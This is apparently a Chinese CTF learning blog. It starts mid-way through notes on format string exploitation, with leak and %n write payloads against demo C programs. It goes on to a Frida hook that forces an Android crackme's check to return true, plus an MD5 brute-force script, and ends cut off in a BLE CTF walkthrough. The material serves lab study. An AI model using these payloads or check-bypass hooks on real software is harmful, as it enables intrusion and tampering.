(0x7ffff7ffd000): 这个地址位于共享库的区域（通常在高地址），可能是指向某个动态库的基地址。r15 (0x555555557dd8): 这个地址位于程序的代码段或数据段，可能指向某个全局变量或静态数据。\n\nrdi 里是格式化字符串\n前面显示了12345，67呢\n在这里\npwndbg&gt; x/4gx $rsp0x7fffffffddd0: 0x0000000000000006      0x00000000000000070x7fffffffdde0: 0x00007fffffffdf28      0x0000000100000000pwndbg&gt; \n\n数据依次排列而printf依次读取\n格式化字符串漏洞的条件用户能控制传递给printf的首个参数。格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。\nint main(int argc, char **argv)&#123;printf(argv[1]);&#125;\n\n格式化字符串在循环中是图灵完备的，以下这个项目基于运行在while循环中的printf,brainfuck\nhttps://github.com/HexHive/printbf\n其他格式化字符串函数\n用于内部逻辑，而不是输入&#x2F;输出操作（例如，sprintf，snprintf，sscanf）\n\n用于日志记录（例如，fprintf）\n\n用于输入（例如，scanf\n\n\n内存泄漏可以使用的字符串\n%c: read a char off the stack   泄露一个字节%d, %i, %x: read an int (4 bytes) off the stack 以十进制整数形式泄露4字节%x: read an int (4 bytes) in hex  以十六进制整数形式泄露4字节%s: dereference a pointer and read out bytes until a null byte  解引用指针，并读取任意字节，直到遇到null字节，这些字节可能是可显或不可显\n\n格式化字符串也能使用大小前缀，或叫大小修饰符\n%x leaks 4 bytes%hx leaks 2 bytes%hhx leaks 1 byte%lx leaks 8 bytes\n\n泄露栈地址demo\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char** argv) &#123;        char fmt_str[256];        char *secret_value = &quot;my secret value&quot;;        strcpy(fmt_str, argv[1]);        strcat(fmt_str, &quot;\\n&quot;);        printf(fmt_str, 0xBEEF1337);        return 0;&#125;\n\n运行\n┌──(pwn㉿kali)-[~/桌面]└─$ ./do &quot;leak:%p&quot;leak:0xbeef1337┌──(pwn㉿kali)-[~/桌面]└─$ ./do &quot;leak:%p %p %p %P&quot;leak:0xbeef1337 0x10 (nil) %P\n\n那么如何获取到secret_value值呢，它在栈上，理论上来说只要一直%p就有机会读到一个像栈地址的值\n使用$可以读取指定位置的参数\n%7$x - print the 7th parameter (on the stack)//打印栈上的第七个值\n\n但是我这里是不行的\n\n作者这里是能成功的\n\n怀疑是不同版本安全策略的问题，栈地址到别的地方去了\n一些小技巧总结\n\n\n利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。\n\n利用%s来获取变量所对应地址的内容，只不过有零截断。\n\n利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容\n\n\n\n拒绝服务用户不能直接提供字符串，而是由他们的行为自动生成。可能导致printf错误解析数据，比如使用%s解析一个指针。\n不需要计算出具体的位置，只需要输入一大堆%s,遇到无法解析的就可以使程序产生错误，这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。\n内存覆盖（写入数据）%n会对传入的指针解引用，然后把已输出的字符串的字节数写到该地址，使用%n可以在输出的同时知道字符的长度\nint namelength;printf(&quot;%s%n&quot;, name, &amp;namelength);printf(&quot;The name was %d bytes long!&quot;, namelength);\n\ndemo\n#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char** argv) &#123;        char fmt_str[256];        char buf[256];        int *print_flag=malloc(sizeof(int));        *print_flag=0;        char *secret_value = &quot;my secret value&quot;;        strcpy(fmt_str, argv[1]);        strcat(fmt_str, &quot;\\n&quot;);        printf(fmt_str, 0xBEEF1337);        if(*print_flag)&#123;                int fd=open(&quot;/catflag&quot;,O_RDONLY);                read(fd,buf,256);                write(1,buf,256);        &#125;        return 0;&#125;\n\n运行\n┌──(pwn㉿kali)-[~/桌面]└─$ ./do &#x27;%x&#x27;beef1337\n\n使用gdb进行调试，在main下断点，然后运行\n反编译main函数，找到 if(*print_flag)在哪开始比较\n\ntest eax, eax 进行的是按位与运算（AND 操作）。对于寄存器 eax，执行的是 eax &amp; eax。由于任何值与自身按位与的结果就是自身，所以这条指令的结果要么是非零值，要么是零：如果 eax 中的值是 0，那么 eax &amp; eax = 0。如果 eax 中的值不是 0，那么 eax &amp; eax ≠ 0。\n\n这一段可能是在进行比较，后面有个je可以执行跳转\n0x0000000000401216 &lt;+144&gt;:   call   0x401060 &lt;printf@plt&gt;0x000000000040121b &lt;+149&gt;:   mov    rax,QWORD PTR [rbp-0x8]0x000000000040121f &lt;+153&gt;:   mov    eax,DWORD PTR [rax]0x0000000000401221 &lt;+155&gt;:   test   eax,eax0x0000000000401223 &lt;+157&gt;:   je     0x401273 &lt;main+237&gt;0x0000000000401225 &lt;+159&gt;:   mov    esi,0x00x000000000040122a &lt;+164&gt;:   lea    rax,[rip+0xde3]        # 0x402014\n\neax&#x3D;rax rax&#x3D;rbp-0x8\n现在输出rbp-0x8 rsp和它们之间的距离\n\n当printf向前查找参数时，步长为8字节（一个参数8字节）0x228 &#x2F;0x8&#x3D;69，第六个参数是第一个栈上的参数，69+6&#x3D;75，我们可以认为从printf的角度看，print_flag是它的第75个参数\n.&#x2F;do ‘a%75$n’ 可以把a的长度1输入到第75个参数位置上，这样就能达成读取文件的目的\n输出了a和一些buf中未初始化的内容\n\n其他方法\nrbp原理\n\n栈上保存的RBP指向前一个栈帧的RBP，能在字符串漏洞中利用，找到第一个保存的RBP，这里的ebp1的距离，ebp1指向一个地址，这里是ebp2,所以可以编写一个漏洞，写入数据到ebp1指向的地址既ebp2,然后就可以找到ebp2的距离（找写入值在第几个参数，再写入数据到ebp2指向的地址。\n这样就可以通过ebp1将真正想要写入的地址写到ebp2,再通过ebp2写入数据到我们选定的地址。通过这样的方法，尽管有ASLR,我们还是能写\n\n\n当格式化字符串的缓冲区在栈上时，我们可以控制格式化字符串缓冲区\n\n在printf被调用时，发生了什么\n\n格式化字符串下会有一个栈帧（不是紧挨着),这意味着应该能找到从RSP到格式化字符串缓冲区的偏移量，\n\n\n写入更多字节\n\n%n只能写入4字节，但如果想写入更多字节呢\n%ln   8bytes%hn   2bytes%hhn  1bytes\n\n\n写入特定字节\n\n可以利用printf的另一个特性——填充 参考printf的man page,命令为：man 3 printf\n这里提供了一个比较大的填充，所以会在16进制数前输出大量空白字符，这些都会输出到标准输出。printf的第二个替换符是%1$n,这里表示引用第一个参数既buf,但因为后面有个n,这个替换符将把已输出的字节长度写入buf,\n#include &lt;stdio.h&gt;#include&lt;unistd.h&gt;int main(int argc,char **argv) &#123;char buf[4];printf(&quot;%1145258561x%1$n&quot;, buf);printf(&quot;\\n\\n\\n&quot;);write(1,buf,4);    return 0;&#125;\n\n数据关系如下：\nHEX  4443 4241DEC  1,145,258,561\n\n按小端序写入 buf 后，就是41，42，43，44，分别对应ABCD,最终write(1, buf, 4) 输出这 4 个字节\n\n但这个非常耗时间，填充了1,145,258,561，这还只是4字节，如果要写入一个8字节地址更费时间\n\n写入更多特定字节\n\n这个方法不需要输入太多填充空白字节\nchar buf[4];printf(&quot;%65x%1$hhn%c%2$hhn%c%3$hhn%c%4$hhn&quot;, buf, buf+1, buf+2, buf+3);\n\n逐步分析\n%65x：输出 65 个字符（通常是空格），使得当前已经输出的字符数为 65。%1$hhn：%n 占位符会将目前输出的字符数写入指定的内存地址。%1$hhn 这里表示将**已经输出的字符数（65）**的低 8 位写入 buf[0]（即 buf 的第一个字节）。结果是 buf[0] 将存储值 65，即字符 &#x27;A&#x27;（ASCII 码 65）。%c：这是一个普通字符输出占位符，用于将参数中的字符输出到终端。第一个 %c 对应 buf+1，buf+1 的初始值未定义，因此输出的字符是不确定的。%2$hhn：将**当前输出的字符数（66）**写入 buf[1]（第二个字节）。结果是 buf[1] 将存储值 66，即字符 &#x27;B&#x27;（ASCII 码 66）。%c：输出 buf+2 的值，未定义，输出的字符不确定。%3$hhn：将**当前输出的字符数（67）**写入 buf[2]（第三个字节）。结果是 buf[2] 将存储值 67，即字符 &#x27;C&#x27;（ASCII 码 67）。%c：输出 buf+3 的值，未定义，输出的字符不确定。%4$hhn：将**当前输出的字符数（68）**写入 buf[3]（第四个字节）。结果是 buf[3] 将存储值 68，即字符 &#x27;D&#x27;（ASCII 码 68）。\n\n\n需要注意的是，ABCD是递增的，这样构造格式化字符串相对简单，但如果是要写DCBA这种递减的值呢\n\n动态填充大小\n\n动态填充大小用*指定，它能让你不再依靠硬编码指定填充长度，你可以在另一个参数中指定填充长度，\n%*10$c%11$n\n\n%*10$c会把第十个参数当作一个数字，表示需要在c前填充的空白字节长度\n11$n会将已输出的字节数写入到给定地址，这会把这个计数写到第十一个参数指定的地址。这直接能拷贝内存了（10th的值拷到了11th的地址处）\n假设第 10 个参数的值为 100，第 11 个参数指向一个重要的内存地址，比如栈上保存的返回地址或者全局变量的地址。那么这条指令会在输出了 100 个字符之后，将字符数（比如 100）写入第 11 个参数指向的内存地址，这可能导致程序行为异常或者被攻击者控制\n但这个用法不太实际，这里不好一次只写一个字节，如果尝试使用这种技术复制整个地址，会输出大量内容。\n参考资料https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/\nhttps://pwn.college/software-exploitation/format-string-exploits/\n"},{"title":"简单hook一下","url":"/2024/09/24/%E7%AE%80%E5%8D%95hook%E4%B8%80%E4%B8%8B/","content":"使用的例题是**[CISCN 2022 东北]crackme_Android，**虽然这题的关键点在MD5爆破，但是它的主逻辑函数包括了“成功”和“失败”的判断，可以验证是否成功hook函数\n\n我的环境\nfrida 16.4.2\n雷电模拟器(adb也是使用的雷电模拟器自带的）\njadx\nIDEA\n\n初步分析初步分析，拖入模拟器后运行，随便输一个数，得到报错信息\n\n在jadx里使用文本搜索找到相应报错信息并得到判断条件\n\n点击if判断里的“check”找到check函数\n\n通过分析可知格式是flag{}，然后还有个MD5,爆破，以下是爆破脚本\nimport hashlib# 待破解MD5值target_md5s =[]flag=&quot;&quot;str=&#x27;8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0&#x27;for i in range(8):    target_md5s.append(str[32*i:32*(i+1)])# 生成所有可能的4位信息的列表passwords = []for a in &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;:    for b in &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;:        for c in &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;:            for d in &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;:                passwords.append(a+b+c+d)# 逐个比较MD5值for md5 in target_md5s:    for password in passwords:        if hashlib.md5(password.encode(&#x27;utf-8&#x27;)).hexdigest() == md5:            flag+=password            print(&quot;Password found: &quot; + password)            breakprint(&quot;flag&#123;&quot;+flag+&quot;&#125;&quot;)\n\n好了题目解出来了，现在继续看hook函数\nhook先找到包名 com.example.crackme1，这一步可以使用MT管理器，但是现在不需要一步一步构建\n找到所需hook的函数”check”,在jadx里直接右键复制代码就行，接下来演示是使用frida就复制frida的\n\n前置准备连接上模拟器，我用的是雷电模拟器，它的启动命令如下\n.\\adb start-server\n\n然后连接frida服务（之前我把frida-server装在了data&#x2F;local&#x2F;tmp文件\n.\\adb shellsucd data/local/tmp./frida-server\n\n然后再开一个窗口进行端口转发\n.\\adb forward tcp:27042 tcp:2704227042\n\n之后可以检查一下有没有连上,有信息出来了就是连上了\nfrida-ls-devicesfrida-ps -U\n\n开始hookfrida-ps -U 找到进程名（这一步前需要你先在模拟器打开crackme1软件才行，不然就不会出现进程名）\n\n然后连接\nfrida -U &quot;进程名“ -l 脚本文件\nfrida -U CrackMe1 -l hook.js 我的脚本文件就是hook.js\n连上了\n\n这是hook.js文件，按照这个模板写就好了\nfunction set_return() &#123;    let MainActivity = Java.use(&quot;com.example.crackme1.MainActivity&quot;);    MainActivity[&quot;check&quot;].implementation = function (flag) &#123;        console.log(`MainActivity.check is called: flag=$&#123;flag&#125;`);        let result = this[&quot;check&quot;](flag);        console.log(`MainActivity.check result=$&#123;result&#125;`);        return true;    &#125;;&#125;function main() &#123;    Java.perform(function() &#123;        set_return();    &#125;);&#125;setImmediate(main);\n\n这里直接改为true，无论怎样都返回true\n\n然后随便输入一个字符，此时点击它的判断就是Right了，就代表hook成功\n\n真机hook基本流程在手机开发者模式打开usb调试，不同的手机开启方式稍有不同，可以在网上搜索打开方式\n将usb线连上手机，在手机确认连接,可以使用以下指令检测有没有成功安装\n.\\adb devices\n\n将apk安装到手机\n.\\adb install 电脑路径  \n\n使用shell启动fs\n.\\adb shellsucd data/local/tmp./fs\n\n然后进行端口转发\n./adb forward tcp:27042 tcp:27042\n\n将hook.js文件连接上手机\nfrida -U CrackMe1 -l hook.js\n\n和模拟器没有很大区别，最后也hook成功了\n\n"},{"title":"ble_ctf wp","url":"/2025/04/26/%E4%BB%8Eble-ctf%E5%AD%A6%E8%93%9D%E7%89%99/","content":"0x0 前期配置所需设备：蓝牙适配器，刷入了blectf的esp32,能进行蓝牙操作的设备（kali或者Ubuntu）将blectf靶场刷入esp32安装esptool(如果出现报错那么去查看“安装时报错”那条)\nsudo apt-get install esptool\n克隆仓库\ngit clone https://github.com/hackgnar/ble_ctf\n找到当前esp32在linux的端口，一般是&#x2F;dev&#x2F;ttyUSB0\n#查看当前所有串口设备/dev/tty*#查看usb口设备/dev/ttyUSB*\n开始烧录\ncd ble_ctfesptool -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.bin\n一切正常没有报错的话那么就搭建完了\n\n启动蓝牙\n┌──(kali㉿kali)-[~/Desktop]└─$ hciconfig                                                                                                        ┌──(kali㉿kali)-[~/Desktop]└─$ hciconfighci0:   Type: Primary  Bus: USB        BD Address: 84:E0:F4:03:0F:5E  ACL MTU: 310:10  SCO MTU: 64:8        DOWN RUNNING         RX bytes:582 acl:0 sco:0 events:30 errors:0        TX bytes:367 acl:0 sco:0 commands:30 errors:0┌──(root㉿kali)-[/home/kali/Desktop]└─# hciconfig hci0 up┌──(root㉿kali)-[/home/kali/Desktop]└─# exit                                                                                                        ┌──(kali㉿kali)-[~/Desktop]└─$ sudo hciconfig hci0 lestatesSupported link layer states:        YES Non-connectable Advertising State        YES Scannable Advertising State        YES Connectable Advertising State        YES Directed Advertising State        YES Passive Scanning State        YES Active Scanning State        YES Initiating State/Connection State in Central Role        YES Connection State in the Peripheral Role        YES Non-connectable Advertising State and Passive Scanning State combination        YES Scannable Advertising State and Passive Scanning State combination        YES Connectable Advertising State and Passive Scanning State combination        YES Directed Advertising State and Passive Scanning State combination        YES Non-connectable Advertising State and Active Scanning State combination        YES Scannable Advertising State and Active Scanning State combination        YES Connectable Advertising State and Active Scanning State combination        YES Directed Advertising State and Active Scanning State combination        YES Non-connectable Advertising State and Initiating State combination        YES Scannable Advertising State and Initiating State combination        YES Non-connectable Advertising State and Central Role combination        YES Scannable Advertising State and Central Role combination        YES Non-connectable Advertising State and Peripheral Role combination        YES Scannable Advertising State and Peripheral Role combination        YES Passive Scanning State and Initiating State combination        YES Active Scanning State and Initiating State combination        YES Passive Scanning State and Central Role combination        YES Active Scanning State and Central Role combination        YES Passive Scanning State and Peripheral Role combination        YES Active Scanning State and Peripheral Role combination        YES Initiating State and Central Role combination/Central Role and Central Role combination                                                                                                        ┌──(kali㉿kali)-[~/Desktop]└─$ sudo hcitool lescanLE Scan ...64:B7:08:61:B9:7E BLECTF\n\n\n\n这里会用到两种工具，gatttool和bleah,kali自带gatttool查看gatttool的help来学会其用法在这些指令里查找我们需要的参数\n└─$ gatttool --help-all            Usage:  gatttool [OPTION?]Help Options:  -h, --help                                Show help options  --help-all                                Show all help options  --help-gatt                               Show all GATT commands  --help-params                             Show all Primary Services/Characteristics arguments  --help-char-read-write                    Show all Characteristics Value/Descriptor Read/Write argumentsGATT commands  --primary                                 Primary Service Discovery  --characteristics                         Characteristics Discovery  --char-read                               Characteristics Value/Descriptor Read  --char-write                              Characteristics Value Write Without Response (Write Command)  --char-write-req                          Characteristics Value Write (Write Request)  --char-desc                               Characteristics Descriptor Discovery  --listen                                  Listen for notifications and indicationsPrimary Services/Characteristics arguments  -s, --start=0x0001                        Starting handle (optional)  -e, --end=0xffff                          Ending handle (optional)  -u, --uuid=0x1801                         UUID16 or UUID128 (optional)Characteristics Value/Descriptor Read/Write arguments  -a, --handle=0x0001                       Read/Write characteristic by handle (required)  -n, --value=0x0001                        Write characteristic value (required for write operation)Application Options:  -i, --adapter=hciX                        Specify local adapter interface  -b, --device=MAC                          Specify remote Bluetooth address  -t, --addr-type=[public | random]         Set LE address type. Default: public  -m, --mtu=MTU                             Specify the MTU size  -p, --psm=PSM                             Specify the PSM for GATT/ATT over BR/EDR  -l, --sec-level=[low | medium | high]     Set security level. Default: low  -I, --interactive                         Use interactive mode\n\n\n关于这个挑战的源代码在main&#x2F;gatts_table_creat_demo.c文件里服务器通过内部变量(flag_state数组、score计数器)跟踪每个挑战是否完成这是题目们对应的标志\nstatic const uint16_t GATTS_SERVICE_UUID_TEST                   = 0x00FF;static const uint16_t GATTS_CHAR_UUID_SCORE                     = 0xFF01;static const uint16_t GATTS_CHAR_UUID_FLAG                      = 0xFF02;static const uint16_t GATTS_CHAR_UUID_FLAG_SIMPLE_READ          = 0xFF03;static const uint16_t GATTS_CHAR_UUID_FLAG_MD5                  = 0xFF04;static const uint16_t GATTS_CHAR_UUID_FLAG_WRITE_ANYTHING       = 0xFF05;static const uint16_t GATTS_CHAR_UUID_FLAG_WRITE_ASCII          = 0xFF06;static const uint16_t GATTS_CHAR_UUID_FLAG_WRITE_HEX            = 0xFF07;static const uint16_t GATTS_CHAR_UUID_FLAG_SIMPLE_WRITE2_READ   = 0xFF08;static const uint16_t GATTS_CHAR_UUID_FLAG_SIMPLE_WRITE2        = 0xFF09;static const uint16_t GATTS_CHAR_UUID_FLAG_BRUTE_WRITE          = 0xFF0a;static const uint16_t GATTS_CHAR_UUID_FLAG_READ_ALOT            = 0xFF0b;static const uint16_t GATTS_CHAR_UUID_FLAG_NOTIFICATION         = 0xFF0c;static const uint16_t GATTS_CHAR_UUID_FLAG_INDICATE_READ        = 0xFF0d;static const uint16_t GATTS_CHAR_UUID_FLAG_INDICATE             = 0xFF0e;static const uint16_t GATTS_CHAR_UUID_FLAG_NOTIFICATION_MULTI   = 0xFF0f;static const uint16_t GATTS_CHAR_UUID_FLAG_INDICATE_MULTI_READ  = 0xFF10;static const uint16_t GATTS_CHAR_UUID_FLAG_INDICATE_MULTI       = 0xFF11;static const uint16_t GATTS_CHAR_UUID_FLAG_MAC                  = 0xFF12;static const uint16_t GATTS_CHAR_UUID_FLAG_MTU                  = 0xFF13;static const uint16_t GATTS_CHAR_UUID_FLAG_WRITE_RESPONSE       = 0xFF14;static const uint16_t GATTS_CHAR_UUID_FLAG_HIDDEN_NOTIFY        = 0xFF15;static const uint16_t GATTS_CHAR_UUID_FLAG_CRAZY                = 0xFF16;static const uint16_t GATTS_CHAR_UUID_FLAG_TWITTER              = 0xFF17;\n0x1基础验证这里是基本的句柄写入，也可以用来测试当前环境是否可用，输完第一句后esp32会出现一个蓝色的灯代表连接好了并且在这里说一下提交的要求：默认情况下，读取前20个字节(如果您使用的是 gatttool，请确保使用 xxd 将其转换为十六进制。如果你使用的是 bleah，你可以将其作为字符串值发送)并将其写入句柄0x002c\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score: 0/20┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;12345678901234567890&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:1 /20  \n解析指令这是主要部分\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a\n\n-b指定目标蓝牙\n–char-read 指定要执行的操作\n-a 指定句柄后面的部分是对数据的处理，过滤我们所需的信息|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;\n\n0x2 查看及提交句柄%% 查看 handle 的 ascii 值 0x002e 并将其提交给 flag submision handle 0x002c。如果您使用的是 gatttool，请确保使用 xxd 将其转换为十六进制。如果你使用的是 bleah，你可以将其作为字符串值发送 %%\n进行拆解现在需要读取目标蓝牙的0x002e的值\n\n指定目标 -b 64:B7:08:61:B9:7E \n读取操作  –char-read \n指定句柄 -a 0x002e因此指令为：gatttool -b 64:B7:08:61:B9:7E  --char-read  -a 0x002e└─$ gatttool -b 64:B7:08:61:B9:7E  --char-read  -a 0x002eCharacteristic value/descriptor: 64 32 30 35 33 30 33 65 30 39 39 63 65 66 66 34 34 38 33 35 \n出现的是原始数据，我们需要对其进行处理┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002e|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;d205303e099ceff44835\n读取成功接下来是写操作，需要将得到的值传递给句柄0x002c\n指定目标 -b 64:B7:08:61:B9:7E \n写操作 ，写操作这里有两种 ，–char-write无响应，–char-write-req有响应，推荐使用–char-writr-req\n–char-write                              Characteristics Value Write Without Response (Write Command)\n–char-write-req                          Characteristics Value Write (Write Request)\n\n\n指定句柄 -a 0x002c  读写操作都是使用-a指定句柄\n传入要写入指定句柄的数据 -n d205303e099ceff44835\n题目要求为“请确保使用 xxd 将其转换为十六进制”，因此-n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)总的指令就是：gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)\n成功┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E  --char-read  -a 0x002eCharacteristic value/descriptor: 64 32 30 35 33 30 33 65 30 39 39 63 65 66 66 34 34 38 33 35 ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002e|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;d205303e099ceff44835┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:2 /20   \n\n\n\n0x3%% 查看 handle 0x0030 的 ascii 值。按照它告诉你的去做，并将你找到的标志提交给 0x002c %%\n按照之前的思路来读取句柄值\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0030|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;\n要求是设备的md5值（MD5 of Device Name）接下来的步骤除了转换md5值就和0x2一样了\n┌──(kali㉿kali)-[~/Desktop]└─$ echo -n &quot;BLECTF&quot; |md5sum5cd56d74049ae40f442ece036c6f4f06  -     \n需要注意的是，这里只需要传入前20个字符，后续的操作也是这样的，只要前20个字符，并且依旧遵循“如果您使用的是 gatttool，请确保使用 xxd 将其转换为十六进制。”\ngatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;5cd56d74049ae40f442e&quot;|xxd -ps)\n成功\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0030|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;MD5 of Device Name┌──(kali㉿kali)-[~/Desktop]└─$ echo -n &quot;BLECTF&quot; |md5sum5cd56d74049ae40f442ece036c6f4f06  -┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;5cd56d74049ae40f442e&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:3 /20\n0x4 查找指定的句柄%% 蓝牙 GATT 服务提供了一些额外的设备属性。尝试查找 Generic Access -&gt; Device Name 的值。 %%\n查找值在官网就可以查到具体的UUID值，ctrl+f搜索Device Name就可以得到0x2A00,使用-u 来指定uuid就可以对Device Name进行读取BLE的属性类型是有限的，有四个大类：\n\nPrimary Service（首要服务项）\nSecondary Service（次要服务项）\nInclude（包含服务项）\nCharacteristic（特征值）也可以进行手动排查#找出设备提供哪些顶层服务及其范围gatttool -b 64:B7:08:61:B9:7E --primary#分区查找特征值gatttool -b 64:B7:08:61:B9:7E --characteristics -s 0x0001 -e 0x0007#直接查找全部特征值gatttool -b 64:B7:08:61:B9:7E --characteristics  \n结果如下┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --primary[sudo] password for kali: attr handle = 0x0001, end grp handle = 0x0005 uuid: 00001801-0000-1000-8000-00805f9b34fbattr handle = 0x0014, end grp handle = 0x001c uuid: 00001800-0000-1000-8000-00805f9b34fbattr handle = 0x0028, end grp handle = 0xffff uuid: 000000ff-0000-1000-8000-00805f9b34fb┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --characteristics -s 0x0014 -e 0x001chandle = 0x0015, char properties = 0x02, char value handle = 0x0016, uuid = 00002a00-0000-1000-8000-00805f9b34fbhandle = 0x0017, char properties = 0x02, char value handle = 0x0018, uuid = 00002a01-0000-1000-8000-00805f9b34fbhandle = 0x0019, char properties = 0x02, char value handle = 0x001a, uuid = 00002aa6-0000-1000-8000-00805f9b34fb\n\n在另一个窗口开启btmon在btmon日志里得到uuid和句柄，可以看到Value Handle: 0x0016 Value UUID: Device Name (0x2a00)\ngatttool[117489]: &lt; ACL Data..X flags 0x00 dlen 11  #1573 [hci0] 23271.388417      ATT: Read By Type Request (0x08) len 6        Handle range: 0x0014-0x001c        Attribute type: Characteristic (0x2803)&gt; HCI Event: Number of Completed... (0x13) plen 5  #1574 [hci0] 23271.428098        Num handles: 1        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)        Count: 1        #1573: len 11 (2 Kb/s)        Latency: 39 msec (39-39 msec ~39 msec)&gt; ACL Data RX: Handle 71 flags 0x02 dlen 27        #1575 [hci0] 23271.475504      ATT: Read By Type Response (0x09) len 22        Attribute data length: 7        Attribute data list: 3 entries        Handle: 0x0015        Value[5]: 021600002a            Properties: 0x02              Read (0x02)            Value Handle: 0x0016            Value UUID: Device Name (0x2a00)        Handle: 0x0017        Value[5]: 021800012a            Properties: 0x02              Read (0x02)            Value Handle: 0x0018            Value UUID: Appearance (0x2a01)        Handle: 0x0019        Value[5]: 021a00a62a            Properties: 0x02              Read (0x02)            Value Handle: 0x001a            Value UUID: Central Address Resolution (0x2aa6)\n\n使用–characteristics 会有很多输出，这个时候可以对其进行过滤\n#查找所有特征值gatttool -b 64:B7:08:61:B9:7E --characteristics # 启动 btmon 并寻找和目标（Device Name)有关的请求和响应sudo btmon | grep -A 5 -B 5 -i &#x27;Device Name&#x27; \n结果如下\n┌──(kali㉿kali)-[~/Desktop]└─$ sudo btmon | grep -A 5 -B 5 -i &#x27;Device Name&#x27;           Handle: 0x0015        Value[5]: 021600002a            Properties: 0x02              Read (0x02)            Value Handle: 0x0016            Value UUID: Device Name (0x2a00)        Handle: 0x0017        Value[5]: 021800012a            Properties: 0x02              Read (0x02)            Value Handle: 0x0018\n进行读取从句柄来读取-a\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0016|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;\n从uuid来读-u\ngatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00 | awk -F&#x27;value: &#x27; 